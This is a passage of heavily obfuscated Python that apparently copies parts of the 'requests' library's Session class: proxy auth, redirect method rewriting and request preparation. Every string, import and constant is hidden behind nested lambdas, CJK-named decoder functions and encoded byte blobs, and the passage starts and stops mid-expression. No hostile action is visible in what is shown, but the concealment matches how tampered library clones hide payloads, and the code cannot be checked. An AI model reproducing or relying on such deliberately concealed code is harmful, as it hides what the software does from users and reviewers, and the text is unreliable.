樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())()]
                try:
                    username, password = get_auth_from_url(new_proxies[scheme])
                except KeyError:
                    username, password = (None, None)
                if not scheme.startswith((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()) and username and password:
                    headers[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x13'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())()] = _basic_auth_str(username, password)
                return new_proxies

            def rebuild_method(self, prepared_request, response):
                method = prepared_request.method
                if response.status_code == codes.see_other and method != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe1'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdd'))()]))))())())():
                    method = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())()
                if response.status_code == codes.found and method != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe1'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdd'))()]))))())())():
                    method = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())()
                if response.status_code == codes.moved and method == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xec'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())():
                    method = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())()
                prepared_request.method = method

            def __enter__(self):
                return self

            def __exit__(self, *args):
                for v in self.adapters.values():
                    v.close()

            def request(self, method, url, params=None, data=None, headers=None, cookies=None, files=None, auth=None, timeout=None, allow_redirects=(lambda: (lambda 陊玉筍赜櫒蓲: 陊玉筍赜櫒蓲 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())(), proxies=None, hooks=None, stream=None, verify=None, cert=None, json=None):
                req = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).models.Request(method=method.upper(), url=url, headers=headers, files=files, data=data or {}, json=json, params=params or {}, auth=auth, cookies=cookies, hooks=hooks)
                cookies = req.cookies or {}
                if not isinstance(cookies, 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))()]))))())())()).cookiejar.CookieJar):
                    cookies = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).cookies.cookiejar_from_dict(cookies)
                auth = req.auth
                if self.trust_env and (not auth) and (not self.auth):
                    auth = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).utils.get_netrc_auth(req.url)
                prep = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).models.PreparedRequest()
                prep.prepare(method=req.method.upper(), url=req.url, files=req.files, data=req.data, json=req.json, headers=self.merge_setting(req.headers, self.headers, dict_class=襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).structures.CaseInsensitiveDict), params=self.merge_setting(req.params, self.params), auth=self.merge_setting(auth, self.auth), cookies=襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 